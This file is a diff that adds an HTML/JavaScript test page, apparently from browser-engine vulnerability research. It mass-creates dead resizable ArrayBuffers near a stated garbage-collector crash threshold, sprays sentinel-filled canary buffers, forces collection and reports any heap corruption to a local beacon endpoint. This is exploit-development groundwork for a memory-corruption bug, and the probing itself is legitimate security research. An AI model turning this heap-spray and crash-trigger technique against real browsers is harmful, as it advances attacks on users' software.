@@ -1,0 +1,179 @@
+<!--
+  p608s: Can we detect heap corruption before the crash?
+
+  The GC crashes at ~20,340 dead resizable ABs. The crash is during GC
+  collection of resizable AB metadata. If the GC corrupts nearby heap
+  data before crashing, we might detect it in victim objects.
+
+  Strategy:
+  - Section A: Create 20000 dead resizable ABs (below threshold)
+  - Spray 1000 "canary" ArrayBuffers with known sentinel patterns
+  - Force GC (should survive at 20000 ABs — below ~20340 threshold)
+  - Check canaries for corruption
+
+  - Section B: Create 20300 dead resizable ABs (JUST below crash ~20340)
+  - Spray canaries
+  - Force GC (might survive or crash right at the edge)
+  - Check canaries
+
+  - Section C: Try to catch corruption by interleaving resizable ABs
+    with normal ABs containing sentinels
+
+  CRASH_CLASS: MODERATE
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p608s</title>
+<script>
+var bx=new XMLHttpRequest();
+function b(m){try{bx.open('GET','/beacon/'+encodeURIComponent(m),false);bx.send();}catch(e){}}
+function bp(m,d){try{var x=new XMLHttpRequest();x.open('POST','/beacon/'+encodeURIComponent(m),false);x.send(d);}catch(e){}}
+
+function main(){
+b('P608S-CORRUPTION-DETECT');
+
+// Section A: 20000 dead resizable ABs + canaries + forced GC
+b('SEC-A-20000-PLUS-CANARIES');
+
+// Phase 1: Create dead resizable ABs (with progress beacons)
+function createDeadResizable(count){
+    for(var i=0;i<count;i++){
+        if(i%5000===0) b('DR-I'+i);
+        var ab=new ArrayBuffer(0x100,{"maxByteLength":0x100});
+        var ta=new Uint32Array(ab);
+        ta[0]=42;
+    }
+}
+
+createDeadResizable(19000);
+b('A-19K-DEAD-CREATED');
+
+// Phase 2: Spray canary buffers with sentinel patterns
+var canaries=[];
+for(var i=0;i<1000;i++){
+    var cab=new ArrayBuffer(256);
+    var cv=new Uint32Array(cab);
+    for(var j=0;j<64;j++) cv[j]=0xDEADBEEF;
+    cv[0]=0xCAFE0000|i;  // unique ID per canary
+    canaries.push(cv);
+}
+b('A-CANARIES-SPRAYED');
+
+// Phase 3: Force GC
+for(var g=0;g<5000;g++){
+    var garbage=new Array(128);
+    for(var j=0;j<128;j++) garbage[j]={x:g,y:j,z:new ArrayBuffer(64)};
+}
+b('A-GC-SURVIVED');
+
+// Phase 4: Check canaries
+var corrupted=0;
+var corruptDetails=[];
+for(var i=0;i<canaries.length;i++){
+    var cv=canaries[i];
+    var expectedId=0xCAFE0000|i;
+    if(cv[0]!==expectedId){
+        corrupted++;
+        corruptDetails.push('c'+i+':id=0x'+cv[0].toString(16));
+    }
+    for(var j=1;j<64;j++){
+        if(cv[j]!==0xDEADBEEF){
+            corrupted++;
+            corruptDetails.push('c'+i+'['+j+']=0x'+(cv[j]>>>0).toString(16));
+            break; // one per canary
+        }
+    }
+}
+b('A-CORRUPT='+corrupted);
+if(corruptDetails.length>0) bp('A-DETAILS', corruptDetails.slice(0,20).join(','));
+
+// Section B: 20300 dead resizable ABs (edge of crash threshold)
+b('SEC-B-20300-EDGE');
+
+createDeadResizable(20300);
+b('B-20300-DEAD-CREATED');
+
+var canaries2=[];
+for(var i=0;i<500;i++){
+    var cab=new ArrayBuffer(256);
+    var cv=new Uint32Array(cab);
+    for(var j=0;j<64;j++) cv[j]=0xBAADF00D;
+    cv[0]=0xBEEF0000|i;
+    canaries2.push(cv);
+}
+b('B-CANARIES-SPRAYED');
+
+for(var g=0;g<5000;g++){
+    var garbage=new Array(128);
+    for(var j=0;j<128;j++) garbage[j]={x:g,y:j,z:new ArrayBuffer(64)};
+}
+b('B-GC-SURVIVED');
+
+var corrupted2=0;
+var corruptDetails2=[];
+for(var i=0;i<canaries2.length;i++){
+    var cv=canaries2[i];
+    var expectedId=0xBEEF0000|i;
+    if(cv[0]!==expectedId){
+        corrupted2++;
+        corruptDetails2.push('c'+i+':id=0x'+cv[0].toString(16));
+    }
+    for(var j=1;j<64;j++){
+        if(cv[j]!==0xBAADF00D){
+            corrupted2++;
+            corruptDetails2.push('c'+i+'['+j+']=0x'+(cv[j]>>>0).toString(16));
+            break;
+        }
+    }
+}
+b('B-CORRUPT='+corrupted2);
+if(corruptDetails2.length>0) bp('B-DETAILS', corruptDetails2.slice(0,20).join(','));
+
+// Section C: Interleaved — create resizable ABs with canaries mixed in
+b('SEC-C-INTERLEAVED');
+var interCanaries=[];
+for(var i=0;i<20500;i++){
+    var ab=new ArrayBuffer(0x100,{"maxByteLength":0x100});
+    var ta=new Uint32Array(ab);
+    ta[0]=42;
+    // Every 100 ABs, insert a canary
+    if(i%100===0){
+        var cab=new ArrayBuffer(256);
+        var cv=new Uint32Array(cab);
+        for(var j=0;j<64;j++) cv[j]=0xFEEDFACE;
+        cv[0]=0xF00D0000|(i/100);
+        interCanaries.push({idx:i,view:cv});
+    }
+}
+b('C-INTERLEAVED-CREATED');
+b('C-FORCING-GC');
+for(var g=0;g<5000;g++){
+    var garbage=new Array(128);
+    for(var j=0;j<128;j++) garbage[j]={x:g,y:j,z:new ArrayBuffer(64)};
+}
+b('C-GC-SURVIVED');
+
+var corrupted3=0;
+var details3=[];
+for(var k=0;k<interCanaries.length;k++){
+    var c=interCanaries[k];
+    var cv=c.view;
+    var expectedId=0xF00D0000|c.idx/100;
+    if(cv[0]!==expectedId){
+        corrupted3++;
+        details3.push('i'+c.idx+':id=0x'+cv[0].toString(16));
+    }
+    for(var j=1;j<64;j++){
+        if(cv[j]!==0xFEEDFACE){
+            corrupted3++;
+            details3.push('i'+c.idx+'['+j+']=0x'+(cv[j]>>>0).toString(16));
+            break;
+        }
+    }
+}
+b('C-CORRUPT='+corrupted3);
+if(details3.length>0) bp('C-DETAILS', details3.slice(0,20).join(','));
+
+b('P608S-COMPLETE');
+}
+
+setTimeout(main,200);
+</script></head><body>p608s: corruption detect</body></html>
